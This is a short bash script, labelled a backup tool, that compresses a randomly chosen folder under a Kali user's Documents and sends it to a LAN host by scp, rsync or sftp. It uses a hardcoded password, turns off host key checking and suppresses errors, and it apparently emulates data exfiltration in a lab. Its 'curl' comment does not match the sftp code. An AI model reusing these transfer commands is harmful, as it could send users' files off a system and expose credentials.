#!/bin/bash

# backup.sh - A script to randomly select a directory, compress it, and transfer the backup to a remote server.

# This script performs the following steps:
# 1. Defines a base directory to search for subdirectories.
# 2. Ensures the base directory exists; exits if it does not.
# 3. Randomly selects a subdirectory within the base directory.
# 4. Compresses the selected directory into a tar.gz file.
# 5. Randomly selects a transfer method (scp, rsync, or curl) to send the backup file to a remote server.
# 6. Transfers the backup file to the specified remote server using the chosen method.

# Variables:
# - BASE_DIR: The base directory containing subdirectories to back up.
# - REMOTE_USER: The username for the remote server.
# - REMOTE_HOST: The IP address or hostname of the remote server.
# - REMOTE_PATH: The destination path on the remote server for the backup file.
# - BACKUP_FILE: The temporary file path for the compressed backup.

# Transfer Methods:
# - scp: Securely copies the backup file to the remote server.
# - rsync: Synchronizes the backup file to the remote server.
# - curl: Transfers the backup file using SFTP via curl.

# Prerequisites:
# - The `sshpass` utility must be installed for password-based authentication.
# - The `tar`, `scp`, `rsync`, and `curl` commands must be available on the system.
# - The remote server must allow password-based SSH/SFTP access.

# Notes:
# - The script uses `sshpass` to provide the password for SSH-based commands.
# - Strict host key checking is disabled for simplicity, which may pose a security risk.
# - The script outputs the path of the backup file upon completion.

BASE_DIR="/home/kali/Documents"

REMOTE_USER="kali"
REMOTE_HOST="192.168.0.56"
REMOTE_PATH="/home/kali/Downloads"

# Ensure the base directory exists
if [ ! -d "$BASE_DIR" ]; then
    echo "Base directory $BASE_DIR does not exist. Exiting."
    exit 1
fi

# Get a list of directories within BASE_DIR and choose one at random
DIR_LIST=("$BASE_DIR"/*/)
if [ ${#DIR_LIST[@]} -eq 0 ]; then
    echo "No directories found in $BASE_DIR. Exiting."
    exit 1
fi

RANDOM_DIR="${DIR_LIST[RANDOM % ${#DIR_LIST[@]}]}"
RANDOM_DIR_NAME=$(basename "$RANDOM_DIR")

BACKUP_FILE="/tmp/${RANDOM_DIR_NAME}_backup.tar.gz"

# Compress the selected directory
tar -czf "$BACKUP_FILE" -C "$BASE_DIR" "$RANDOM_DIR_NAME"

# Randomly select a transfer method
TRANSFER_METHODS=("scp" "rsync" "curl")
METHOD=${TRANSFER_METHODS[$RANDOM % ${#TRANSFER_METHODS[@]}]}

case $METHOD in
    "scp")
        sshpass -p "kali" scp -o StrictHostKeyChecking=no "$BACKUP_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH" 2>/dev/null | grep '^/' | tail -n 1
        ;;
    "rsync")
	sshpass -p "kali" rsync -avz -e "ssh -o StrictHostKeyChecking=no" "$BACKUP_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH" 2>/dev/null | grep '^/' | tail -n 1
        ;;
    "curl")
	sshpass -p "kali" sh -c 'echo "put '"$BACKUP_FILE"'" | sftp -o StrictHostKeyChecking=no "'"$REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH"'"' 2>/dev/null | grep '^/' | tail -n 1
        ;;
esac

echo $BACKUP_FILE
